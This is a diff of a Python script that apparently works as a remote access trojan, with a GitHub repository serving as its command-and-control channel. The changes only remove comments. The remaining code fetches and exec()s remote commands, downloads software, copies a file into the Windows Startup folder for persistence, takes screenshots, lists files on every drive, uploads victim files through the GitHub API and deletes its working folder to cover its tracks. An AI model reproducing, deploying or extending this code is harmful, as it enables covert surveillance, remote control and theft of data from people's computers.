@@ -38,7 +38,7 @@ try:
         except:
             pass
 
-    #__________(deleted)__________#
+
     def last_visit(TOKEN):
         time = datetime.now()
         with open(file="last_visit.ini", mode="w") as f:
@@ -62,12 +62,12 @@ try:
         repo = g.get_user().get_repo("python")
         file = repo.get_dir_contents("result_condition.ini")
         repo.update_file("result_condition.ini", "condition", "result_condition = False", sha=file.sha)
-    # __________(deleted)__________#
+
 
     def send_main_information(TOKEN, content, name_file_to_site):
         sha = requests.get(f"https://api.github.com/repos/ehsanmehran/python/contents/{name_file_to_site}",
                            headers={"Authorization": f"token {TOKEN}"}).json()["sha"]
-        content_base64 = base64.b64encode(content.encode()).decode()  # Encode content to Base64
+        content_base64 = base64.b64encode(content.encode()).decode()
         data = {"content": content_base64, "message": "data", "sha": sha}
         data = json.dumps(data)
         main = requests.put(f"https://api.github.com/repos/ehsanmehran/python/contents/{name_file_to_site}", data=data,
@@ -76,11 +76,10 @@ try:
     def Rmpydir():
         system("rmdir /s /q python")
 
-        ########
     def send_file_to_git(TOKEN, content, name_file_to_site):
         sha = requests.get(f"https://api.github.com/repos/ehsanmehran/python/contents/{name_file_to_site}",
                            headers={"Authorization": f"token {TOKEN}"}).json()["sha"]
-        content_base64 = base64.b64encode(content).decode()  # Encode content to Base64
+        content_base64 = base64.b64encode(content).decode()
         data = {"content": content_base64, "message": "data", "sha": sha}
         data = json.dumps(data)
         main = requests.put(f"https://api.github.com/repos/ehsanmehran/python/contents/{name_file_to_site}",
@@ -125,18 +124,18 @@ while True:
                     exec(f.read())
                 if not path.exists("software"):mkdir("software")
                 download(url=link, dest_folder="software")
-                send_main_information(TOKEN=TOKEN , content="result_condition = False" , name_file_to_site="result_condition.ini")# send_condition(TOKEN)
+                send_main_information(TOKEN=TOKEN , content="result_condition = False" , name_file_to_site="result_condition.ini")
                 move_file("\Startup")
                 Rmpydir()
-                send_main_information(TOKEN=TOKEN, content=str(datetime.now()), name_file_to_site="last_visit.ini")# last_visit(TOKEN)
+                send_main_information(TOKEN=TOKEN, content=str(datetime.now()), name_file_to_site="last_visit.ini")
 
 
             elif result_condition == "one_line_commands":
                 with open(file="python/one_line_commands.ini", mode="r") as f:
                     exec(f.read())
-                send_main_information(TOKEN=TOKEN, content="result_condition = False", name_file_to_site="result_condition.ini")# send_condition(TOKEN)
+                send_main_information(TOKEN=TOKEN, content="result_condition = False", name_file_to_site="result_condition.ini")
                 Rmpydir()
-                send_main_information(TOKEN=TOKEN, content=str(datetime.now()), name_file_to_site="last_visit.ini")# last_visit(TOKEN)
+                send_main_information(TOKEN=TOKEN, content=str(datetime.now()), name_file_to_site="last_visit.ini")
 
 
             elif result_condition == "camera":
@@ -146,12 +145,12 @@ while True:
                 with open('code_image.ini', "wb") as file:
                     file.write(converted_string)
                 with open(file="code_image.ini", mode="r") as f:
-                    send_main_information(TOKEN=TOKEN, content=str(f.read()),name_file_to_site="code_image.ini")#code_image(TOKEN)
-                send_main_information(TOKEN=TOKEN, content="result_condition = False", name_file_to_site="result_condition.ini")# send_condition(TOKEN)
+                    send_main_information(TOKEN=TOKEN, content=str(f.read()),name_file_to_site="code_image.ini")
+                send_main_information(TOKEN=TOKEN, content="result_condition = False", name_file_to_site="result_condition.ini")
                 pathlib.Path("screen.png").unlink()
                 pathlib.Path("code_image.ini").unlink()
                 Rmpydir()
-                send_main_information(TOKEN=TOKEN, content=str(datetime.now()),name_file_to_site="last_visit.ini")  # last_visit(TOKEN)
+                send_main_information(TOKEN=TOKEN, content=str(datetime.now()),name_file_to_site="last_visit.ini")
 
             elif result_condition == "scan_system":
                 drives = win32api.GetLogicalDriveStrings()
@@ -165,9 +164,9 @@ while True:
                     with open(f"{list(i)[0]}.ini", mode="r", encoding="utf8") as f:
                         send_main_information(TOKEN=TOKEN, content=f.read(), name_file_to_site=f"{list(i)[0]}.ini")
                     remove(f"{list(i)[0]}.ini")
-                send_main_information(TOKEN=TOKEN, content="result_condition = False",name_file_to_site="result_condition.ini")  # send_condition(TOKEN)
+                send_main_information(TOKEN=TOKEN, content="result_condition = False",name_file_to_site="result_condition.ini")
                 Rmpydir()
-                send_main_information(TOKEN=TOKEN, content=str(datetime.now()),name_file_to_site="last_visit.ini")  # last_visit(TOKEN)
+                send_main_information(TOKEN=TOKEN, content=str(datetime.now()),name_file_to_site="last_visit.ini")
 
             elif result_condition == "send_file":
                 if path.exists(r"python\file_path.ini"):
@@ -184,12 +183,12 @@ while True:
                                 r.write(f.read())
                             with open("file.ini", "rb") as f:
                                 send_file_to_git(TOKEN=TOKEN, content=f.read(),name_file_to_site="download_file.ini")
-                send_main_information(TOKEN=TOKEN, content="result_condition = False",name_file_to_site="result_condition.ini")  # send_condition(TOKEN)
+                send_main_information(TOKEN=TOKEN, content="result_condition = False",name_file_to_site="result_condition.ini")
                 Rmpydir()
-                send_main_information(TOKEN=TOKEN, content=str(datetime.now()),name_file_to_site="last_visit.ini")  # last_visit(TOKEN)
+                send_main_information(TOKEN=TOKEN, content=str(datetime.now()),name_file_to_site="last_visit.ini")
 
             else:
-                send_main_information(TOKEN=TOKEN, content=str(datetime.now()),name_file_to_site=f"{list(i)[0]}.ini") # last_visit(TOKEN)
+                send_main_information(TOKEN=TOKEN, content=str(datetime.now()),name_file_to_site=f"{list(i)[0]}.ini")
                 sleep(300)
     except Exception as e:
         print(e)
